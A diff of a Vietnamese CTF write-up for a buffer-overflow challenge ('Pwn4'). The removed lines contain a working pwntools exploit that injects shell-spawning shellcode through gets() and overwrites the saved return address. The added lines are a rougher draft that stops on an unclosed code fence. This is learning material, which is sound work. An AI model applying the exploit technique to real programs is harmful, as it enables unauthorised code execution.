@@ -1,94 +1,45 @@
 ---
-title: "Pwn4 - MiniCTF - PTITHCM"
+title: "Pwn4- MiniCTF-PTITHCM"
 date: 2024-01-06 00:00:00 +0700
 categories: [CTF, Binary Exploitation]
-tags: [pwn, shellcode, gets, stack-overflow, format-string, ptithcm]
+tags: [pwn, shellcode, gets, stack-overflow, ptithcm]
 author: datious
-description: "MiniCTF PTITHCM Pwn4 writeup — stack shellcode injection through gets() buffer overflow với all protections disabled."
 ---
 
-# Pwn4 - MiniCTF - PTITHCM
-**Author: D1n0_09-N24DCAT015**
+# Pwn4- MiniCTF-PTITHCM
+*Author: D1n0_09-N24DCAT015*
+Đầu tiên khi tải về ta sẽ có 1 file pwn4.rar => Giải nén nó thì ta nhận được các file sau
+![image](https://hackmd.io/_uploads/rJgQWTggbx.png)
+* Tạo môi trường - Dùng tool pwinit để tạo file patched giữa file binary và file libc do bài cung cấp.
+1.  Bước đầu tiên ta dùng gdb check thử các lớp bảo mật ma chương trình có 
+![image](https://hackmd.io/_uploads/By9tVaelWe.png)
 
-Đầu tiên khi tải về ta sẽ có 1 file `pwn4.rar` → Giải nén ta nhận được các file sau:
-
-![Files](https://hackmd.io/_uploads/rJgQWTggbx.png)
-
-> Dùng tool **pwninit** để tạo file patched giữa binary và libc do bài cung cấp.
-
-## 1. Security Layers
-
-![Checksec](https://hackmd.io/_uploads/By9tVaelWe.png)
-
-→ **Tất cả các lớp bảo mật đều tắt!** Khai thác theo hướng shellcode là hoàn toàn khả thi.
-
-## 2. Phân tích source code
-
-Dùng **Ghidra** để decompile:
-
-```c
+- Tất cả các lớp bảo mật đều tắt. Tiếp theo ta mở source code để tìm lỗ hổng. Dùng tool ghidra để decompile.
+```
 int main(void)
+
 {
   char buf [32];
   
   dump_stack();
   printf("Input: ");
-  gets(buf);        // ← không giới hạn nhập → Buffer Overflow
+  gets(buf);
   printf("Output: ");
-  printf(buf);      // ← format string (bonus)
+  printf(buf);
   putchar(10);
   dump_stack();
   return 0;
 }
 ```
+- Đây là hàm main của chuong trình. Lỗi ở đây là hàm gets() cho nhập không giới hạn trong khi kích thươc của biến buf là 32 => buffer overflow.
+=> Qua đây em quyết định sử dụng shellcode để return vào nó thông qua việc ghi đè save rip nhằm điều khiển chương trình.
+//shellcode
+2. Khai thác 
+- Đầu tiên phải xác nhận offset từ biến buf tới save rip
+- Vì đây là cấu trúc 64bit nên mỗi thanh ghi gồm 8 bytes.
+=> Nhập thử với buf có độ lớn 48 bytes
 
-**Lỗ hổng:**
-- `gets(buf)`: nhập không giới hạn → **Buffer Overflow**
-- `printf(buf)`: **Format String Vulnerability** (bonus)
-
-## 3. Khai thác
-
-### Xác định offset
-
-Vì 64-bit, mỗi thanh ghi 8 bytes.
-
-Thử nhập payload 48 bytes → xác định offset:
-
-![Offset](https://hackmd.io/_uploads/SJjLdTgeWl.png)
-
-→ **Offset = 40 bytes** từ `buf` đến save RIP.
-
-### Địa chỉ stack
-
-Khi run chương trình, `dump_stack()` in ra địa chỉ của `buf`:
-
-```
-0x7fff........: 0000000000000000  ← rsp (đây là địa chỉ buf)
-```
-
-### Exploit Script
-
-```python
-#!/usr/bin/python3
-from pwn import *
-
-p = process('./chall_patched')
-
-# Lấy địa chỉ buf từ output dump_stack
-p.recvuntil(": ")
-buf_addr = int(p.recvuntil(":").strip(b":").strip(), 16)
-log.info(f"buf @ {hex(buf_addr)}")
-
-# Shellcode x86_64
-shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
-
-# Payload
-payload  = shellcode
-payload  = payload.ljust(40, b'A')   # pad đến offset
-payload += p64(buf_addr)              # overwrite RIP → buf (shellcode)
-
-p.sendlineafter("Input: ", payload)
-p.interactive()
-```
-
-> **Lưu ý:** NX tắt nên stack có thể thực thi — đây là lý do shellcode trực tiếp hoạt động.
+![image](https://hackmd.io/_uploads/SJjLdTgeWl.png)
+- Từ đây ta có biết được offset=40
+- Ngoài ra khi run chuong trình còn cung cấp địa chỉ của biến buf như này
+``
